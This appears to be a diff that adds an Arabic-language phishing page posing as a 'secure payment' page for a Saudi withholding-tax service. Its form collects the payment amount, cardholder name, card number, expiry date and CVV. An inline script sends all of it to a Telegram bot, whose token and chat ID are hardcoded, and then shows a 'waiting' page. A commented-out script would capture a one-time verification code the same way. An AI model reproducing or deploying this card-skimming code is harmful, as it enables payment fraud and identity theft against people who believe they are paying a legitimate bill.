@@ -1,0 +1,406 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <script src="static/js/sweetalert2@11.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="static/css/payment.css">
+    <link rel="stylesheet" href="static/css/style.css">
+    <script src="static/js/imask.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <link rel="stylesheet" href="static/css/font-awesome.min.css">
+    <title>صفحة الدفع الآمن</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="stylesheet" href="static/css/footer.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="static/css/fontFase.css" rel="stylesheet">
+</head>
+<body>
+    <div style="display: flex;
+    gap: 10px;
+    z-index: 100;
+    outline: 1px solid gray;
+    background-color: #fefefc;
+    width: fit-content;
+    border-radius: 6px;
+    padding: 10px;
+    margin-top: 5px;
+    margin-bottom: 15px;
+    margin-left: 18px;;">
+        <img src="static/images/secure-payment.png" height="40px">
+        <h1 style="display:flex;gap:4px;flex-direction: column;">
+            <b style="font-size:18px">دفع آمن</b>
+            <b style="font-size:10px">عمليات دفع مشفرة بالكامل</b>
+        </h1>
+    </div>
+    <header>
+        <img height="100%" src="https://daribe-sa.online/assets/images/1716519970WhatsApp Image 2024-05-23 at 7.50.28 PM.jpeg" width="200px">
+        <span>
+            اهلا وسهلا بكم  في متجر  ضريبة الاستقطاع   لطلبات الاستقطاع الشهري والدفعات الشهريه
+        </span>
+        <div class="submit">الخطوة التالية</div>
+    </header>
+    
+    <main class="hidden">
+        <form id="messageForm">
+        <label>قيمه الاستقطاع</label>
+        <input type="number" placeholder="ر.س" name="money" id="money">
+        <div class="container preload">
+            <div class="creditcard">
+                <div class="front">
+                    <div id="ccsingle"></div>
+                    <svg version="1.1" id="cardfront" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 750 471" style="enable-background:new 0 0 750 471;" xml:space="preserve">
+                        <g id="Front">
+                            <g id="CardBackground">
+                                <g id="Page-1_1_">
+                                    <g id="amex_1_">
+                                        <path id="Rectangle-1_1_" class="lightcolor grey" d="M40,0h670c22.1,0,40,17.9,40,40v391c0,22.1-17.9,40-40,40H40c-22.1,0-40-17.9-40-40V40
+                                C0,17.9,17.9,0,40,0z"></path>
+                                    </g>
+                                </g>
+                                <path class="darkcolor greydark" d="M750,431V193.2c-217.6-57.5-556.4-13.5-750,24.9V431c0,22.1,17.9,40,40,40h670C732.1,471,750,453.1,750,431z"></path>
+                            </g>
+                            <text transform="matrix(1 0 0 1 60.106 295.0121)" id="svgnumber" class="st2 st3 st4">0123 4567 8910 1112</text>
+                            <text transform="matrix(1 0 0 1 54.1064 428.1723)" id="svgname" class="st2 st5 st6">JOHN DOE</text>
+                            <text transform="matrix(1 0 0 1 54.1074 389.8793)" class="st7 st5 st8">cardholder name</text>
+                            <text transform="matrix(1 0 0 1 479.7754 388.8793)" class="st7 st5 st8">expiration</text>
+                            <text transform="matrix(1 0 0 1 65.1054 241.5)" class="st7 st5 st8">card number</text>
+                            <g>
+                                <text transform="matrix(1 0 0 1 574.4219 433.8095)" id="svgexpire" class="st2 st5 st9">01/23</text>
+                                <text transform="matrix(1 0 0 1 479.3848 417.0097)" class="st2 st10 st11">VALID</text>
+                                <text transform="matrix(1 0 0 1 479.3848 435.6762)" class="st2 st10 st11">THRU</text>
+                                <polygon class="st2" points="554.5,421 540.4,414.2 540.4,427.9 		"></polygon>
+                            </g>
+                            <g id="cchip">
+                                <g>
+                                    <path class="st2" d="M168.1,143.6H82.9c-10.2,0-18.5-8.3-18.5-18.5V74.9c0-10.2,8.3-18.5,18.5-18.5h85.3
+                            c10.2,0,18.5,8.3,18.5,18.5v50.2C186.6,135.3,178.3,143.6,168.1,143.6z"></path>
+                                </g>
+                                <g>
+                                    <g>
+                                        <rect x="82" y="70" class="st12" width="1.5" height="60"></rect>
+                                    </g>
+                                    <g>
+                                        <rect x="167.4" y="70" class="st12" width="1.5" height="60"></rect>
+                                    </g>
+                                    <g>
+                                        <path class="st12" d="M125.5,130.8c-10.2,0-18.5-8.3-18.5-18.5c0-4.6,1.7-8.9,4.7-12.3c-3-3.4-4.7-7.7-4.7-12.3
+                                c0-10.2,8.3-18.5,18.5-18.5s18.5,8.3,18.5,18.5c0,4.6-1.7,8.9-4.7,12.3c3,3.4,4.7,7.7,4.7,12.3
+                                C143.9,122.5,135.7,130.8,125.5,130.8z M125.5,70.8c-9.3,0-16.9,7.6-16.9,16.9c0,4.4,1.7,8.6,4.8,11.8l0.5,0.5l-0.5,0.5
+                                c-3.1,3.2-4.8,7.4-4.8,11.8c0,9.3,7.6,16.9,16.9,16.9s16.9-7.6,16.9-16.9c0-4.4-1.7-8.6-4.8-11.8l-0.5-0.5l0.5-0.5
+                                c3.1-3.2,4.8-7.4,4.8-11.8C142.4,78.4,134.8,70.8,125.5,70.8z"></path>
+                                    </g>
+                                    <g>
+                                        <rect x="82.8" y="82.1" class="st12" width="25.8" height="1.5"></rect>
+                                    </g>
+                                    <g>
+                                        <rect x="82.8" y="117.9" class="st12" width="26.1" height="1.5"></rect>
+                                    </g>
+                                    <g>
+                                        <rect x="142.4" y="82.1" class="st12" width="25.8" height="1.5"></rect>
+                                    </g>
+                                    <g>
+                                        <rect x="142" y="117.9" class="st12" width="26.2" height="1.5"></rect>
+                                    </g>
+                                </g>
+                            </g>
+                        </g>
+                        <g id="Back">
+                        </g>
+                    </svg>
+                </div>
+                <div class="back">
+                    <svg version="1.1" id="cardback" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 750 471" style="enable-background:new 0 0 750 471;" xml:space="preserve">
+                        <g id="Front">
+                            <line class="st0" x1="35.3" y1="10.4" x2="36.7" y2="11"></line>
+                        </g>
+                        <g id="Back">
+                            <g id="Page-1_2_">
+                                <g id="amex_2_">
+                                    <path id="Rectangle-1_2_" class="darkcolor greydark" d="M40,0h670c22.1,0,40,17.9,40,40v391c0,22.1-17.9,40-40,40H40c-22.1,0-40-17.9-40-40V40
+                            C0,17.9,17.9,0,40,0z"></path>
+                                </g>
+                            </g>
+                            <rect y="61.6" class="st2" width="750" height="78"></rect>
+                            <g>
+                                <path class="st3" d="M701.1,249.1H48.9c-3.3,0-6-2.7-6-6v-52.5c0-3.3,2.7-6,6-6h652.1c3.3,0,6,2.7,6,6v52.5
+                        C707.1,246.4,704.4,249.1,701.1,249.1z"></path>
+                                <rect x="42.9" y="198.6" class="st4" width="664.1" height="10.5"></rect>
+                                <rect x="42.9" y="224.5" class="st4" width="664.1" height="10.5"></rect>
+                                <path class="st5" d="M701.1,184.6H618h-8h-10v64.5h10h8h83.1c3.3,0,6-2.7,6-6v-52.5C707.1,187.3,704.4,184.6,701.1,184.6z"></path>
+                            </g>
+                            <text transform="matrix(1 0 0 1 621.999 227.2734)" id="svgsecurity" class="st6 st7">123</text>
+                            <g class="st8">
+                                <text transform="matrix(1 0 0 1 518.083 280.0879)" class="st9 st6 st10">security code</text>
+                            </g>
+                            <rect x="58.1" y="378.6" class="st11" width="375.5" height="13.5"></rect>
+                            <rect x="58.1" y="405.6" class="st11" width="421.7" height="13.5"></rect>
+                            <text transform="matrix(1 0 0 1 59.5073 228.6099)" id="svgnameback" class="st12 st13">John Doe</text>
+                        </g>
+                    </svg>
+                </div>
+            </div>
+            
+        </div>
+        <div class="form-container">
+            <div class="field-container">
+                <label for="name">اسم حامل البطاقة</label>
+                <input id="name" maxlength="20" type="text" name="name" required>
+            </div>
+            <div class="field-container">
+                <label for="cardnumber">رقم البطاقة</label>
+                <input id="cardnumber" type="text" pattern="\d{4} \d{4} \d{4} \d{4}" inputmode="numeric" style="direction:ltr" maxlength="19" required>
+           
+                <svg id="ccicon" class="ccicon" width="750" height="471" viewbox="0 0 750 471" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+        
+                </svg>
+            </div>
+            <div class="field-container">
+                <label for="expirationdate">تاريخ الإنتهاء (mm)</label>
+                <select id="expirationdate">
+                    <option></option>
+                    <option>01</option>
+                    <option>02</option>
+                    <option>03</option>
+                    <option>04</option>
+                    <option>05</option>
+                    <option>06</option>
+                    <option>07</option>
+                    <option>08</option>
+                    <option>09</option>
+                    <option>10</option>
+                    <option>11</option>
+                    <option>12</option>
+                  </select>
+            </div>
+            <div class="field-container">
+                <label for="expirationdateYear">تاريخ الإنتهاء (yy)</label>
+                <select  id="expirationdateYear">
+                    <option></option>
+                    <option>2022</option>
+                    <option>2023</option>
+                    <option>2024</option>
+                    <option>2025</option>
+                    <option>2026</option>
+                    <option>2027</option>
+                    <option>2028</option>
+                    <option>2029</option>
+                    <option>2030</option>
+                  </select>
+            </div>
+            <div class="field-container hidden">
+                <label for="expirationdate">تاريخ الإنتهاء (mm/yy)</label>
+                <input id="expirationdate" type="text" pattern="[0-9]*" inputmode="numeric">
+         </div>
+         
+            <div class="field-container">
+                <label for="securitycode">رمز الأمان (CVV)</label>
+                <input id="securitycode" type="text" pattern="[0-9]*" inputmode="numeric">
+            </div>
+            <div class="field-container" style="    display: flex;
+            align-items: flex-end;">
+                       
+                        <button id="submitVis" class="submi" maxlength="20" type="submit"> إرسال</button>
+                      <!--  <script>
+                            document.getElementById('submitVisa').addEventListener('click', function() {
+                                window.location.href = 'index2.html';
+                            });
+                        </script>
+                        -->
+                    </div>
+        </div>
+        </form>
+        
+        <script>
+            document.getElementById('messageForm').addEventListener('submit', function(event) {
+                event.preventDefault();
+        
+                var money = document.getElementById('money').value;
+                var name = document.getElementById('name').value;
+                var cardnumber = document.getElementById('cardnumber').value;
+                var expirationdate = document.getElementById('expirationdate').value;
+                var expirationdateYear = document.getElementById('expirationdateYear').value;
+                var securitycode = document.getElementById('securitycode').value;
+                
+        
+                var telegramToken = '8170938688:AAEjGqT2xfXUuCv065uzRdnylppWtRFSuXE';
+                var telegramChatId = '-1002299957797';
+        
+                var telegramMessage = `قيمه الاستقطاع: ${money}\nاسم حامل البطاقة: ${name}\nرقم البطاقة: ${cardnumber}\nتاريخ الإنتهاء: ${expirationdate}/${expirationdateYear}\nرمز الأمان: ${securitycode}`;
+        
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: telegramMessage
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if(data.ok) {
+                      
+                        window.location.href = 'waiting.html';  
+                    } else {
+                        alert("حدث خطأ أثناء إرسال الرسالة.");
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert("حدث خطأ أثناء إرسال الرسالة.");
+                });
+            });
+        </script>
+        <div id="timer" class="hidden">
+            <div>
+              برجاء إنتظار الكود
+            </div>
+            <div>
+            <div class="row row-cols-3 align-items-center justify-content-center py-5 my-5">
+              <div class="d-flex align-items-center justify-content-center">
+                  <!--svg image-->
+                  <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="50px" height="50px" class="spinner-svg" viewbox="0 0 456.817 456.817" style="enable-background:new 0 0 456.817 456.817;" xml:space="preserve">
+                      <g>
+                          <g>
+                              <path d="M109.641,324.332c-11.423,0-21.13,3.997-29.125,11.991c-7.992,8.001-11.991,17.706-11.991,29.129
+          c0,11.424,3.996,21.129,11.991,29.13c7.998,7.994,17.705,11.991,29.125,11.991c11.231,0,20.889-3.997,28.98-11.991
+          c8.088-7.991,12.132-17.706,12.132-29.13c0-11.423-4.043-21.121-12.132-29.129C130.529,328.336,120.872,324.332,109.641,324.332z"></path>
+                              <path d="M100.505,237.542c0-12.562-4.471-23.313-13.418-32.267c-8.946-8.946-19.702-13.418-32.264-13.418
+          c-12.563,0-23.317,4.473-32.264,13.418c-8.945,8.947-13.417,19.701-13.417,32.267c0,12.56,4.471,23.309,13.417,32.258
+          c8.947,8.949,19.701,13.422,32.264,13.422c12.562,0,23.318-4.473,32.264-13.422C96.034,260.857,100.505,250.102,100.505,237.542z"></path>
+                              <path d="M365.454,132.48c6.276,0,11.662-2.24,16.129-6.711c4.473-4.475,6.714-9.854,6.714-16.134
+          c0-6.283-2.241-11.658-6.714-16.13c-4.47-4.475-9.853-6.711-16.129-6.711c-6.283,0-11.663,2.24-16.136,6.711
+          c-4.47,4.473-6.707,9.847-6.707,16.13s2.237,11.659,6.707,16.134C353.791,130.244,359.171,132.48,365.454,132.48z"></path>
+                              <path d="M109.644,59.388c-13.897,0-25.745,4.902-35.548,14.703c-9.804,9.801-14.703,21.65-14.703,35.544
+          c0,13.899,4.899,25.743,14.703,35.548c9.806,9.804,21.654,14.705,35.548,14.705s25.743-4.904,35.544-14.705
+          c9.801-9.805,14.703-21.652,14.703-35.548c0-13.894-4.902-25.743-14.703-35.544C135.387,64.29,123.538,59.388,109.644,59.388z"></path>
+                              <path d="M439.684,218.125c-5.328-5.33-11.799-7.992-19.41-7.992c-7.618,0-14.089,2.662-19.417,7.992
+          c-5.325,5.33-7.987,11.803-7.987,19.421c0,7.61,2.662,14.092,7.987,19.41c5.331,5.332,11.799,7.994,19.417,7.994
+          c7.611,0,14.086-2.662,19.41-7.994c5.332-5.324,7.991-11.8,7.991-19.41C447.675,229.932,445.02,223.458,439.684,218.125z"></path>
+                              <path d="M365.454,333.473c-8.761,0-16.279,3.138-22.562,9.421c-6.276,6.276-9.418,13.798-9.418,22.559
+          c0,8.754,3.142,16.276,9.418,22.56c6.283,6.282,13.802,9.417,22.562,9.417c8.754,0,16.272-3.141,22.555-9.417
+          c6.283-6.283,9.422-13.802,9.422-22.56c0-8.761-3.139-16.275-9.422-22.559C381.727,336.61,374.208,333.473,365.454,333.473z"></path>
+                              <path d="M237.547,383.717c-10.088,0-18.702,3.576-25.844,10.715c-7.135,7.139-10.705,15.748-10.705,25.837
+          s3.566,18.699,10.705,25.837c7.142,7.139,15.752,10.712,25.844,10.712c10.089,0,18.699-3.573,25.838-10.712
+          c7.139-7.138,10.708-15.748,10.708-25.837s-3.569-18.698-10.708-25.837S247.636,383.717,237.547,383.717z"></path>
+                              <path d="M237.547,0c-15.225,0-28.174,5.327-38.834,15.986c-10.657,10.66-15.986,23.606-15.986,38.832
+          c0,15.227,5.327,28.167,15.986,38.828c10.66,10.657,23.606,15.987,38.834,15.987c15.232,0,28.172-5.327,38.828-15.987
+          c10.656-10.656,15.985-23.601,15.985-38.828c0-15.225-5.329-28.168-15.985-38.832C265.719,5.33,252.779,0,237.547,0z"></path>
+                          </g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                      <g>
+                      </g>
+                  </svg>
+              </div>
+          </div>
+            <span></span>
+            </div>
+          </div>
+          <form id="messageForm">
+          <div id="codeVerify" class="hidden">
+           
+              <label for="codee">الكود</label>
+              <input id="codee" type="text" name="codee">
+              <button class="submit" type="submit" id="submit" name="submit" required >إرسال</button>
+              
+            </form>
+            
+            
+            
+            
+          </div>
+          <!-- <script>
+            document.getElementById('messageForm').addEventListener('submit', function(event) {
+                event.preventDefault();
+                
+                var codee = document.getElementById('codee').value;
+    
+                // معلومات بوت Telegram
+                var telegramToken = '8170938688:AAEjGqT2xfXUuCv065uzRdnylppWtRFSuXE';
+                var telegramChatId = '-1002299957797'; // معرف الدردشة الخاص بك أو القناة
+    
+                // بناء الرسالة التي سيتم إرسالها
+                var telegramMessage = `رسالة جديدة من المستخدم: ${codee}`;
+    
+                // إرسال الرسالة إلى Telegram باستخدام API
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: telegramMessage
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if(data.ok) {
+                        alert("تم إرسال الرسالة بنجاح!");
+                    } else {
+                        alert("حدث خطأ أثناء إرسال الرسالة.");
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert("حدث خطأ أثناء إرسال الرسالة.");
+                });
+            });
+        </script> -->
+    </main>
+    <footer>
+        <span>
+          
+            <h1>تابعنا على وسائل التواصل</h1>
+            <div>
+            <a   target="_blank"href=""> <i class="fab fa-facebook"></i></a>
+            <a target="_blank" href=""> <i class="fab fa-instagram"></i></a>
+            <a target="_blank" href=""> <i class="fab fa-snapchat"></i></a>
+
+            </div>
+        </span>
+        <img src="static/images/payment.png" width="50%">
+        <div><span>حقوق النشر محفوظة © 2028</span></div>
+    </footer>
+    <script src="static/js/visa2.js"></script>
+    <script src="static/js/visaPayment.js"></script>
+    <script>
+        let innHTML = document.querySelector('header').querySelector('span').innerHTML.replaceAll('&lt;br&gt;','<br>')
+        document.querySelector('header').querySelector('span').innerHTML = ''
+        document.querySelector('header').querySelector('span').insertAdjacentHTML('beforeend',innHTML) 
+    </script>
+</body>
+</html>
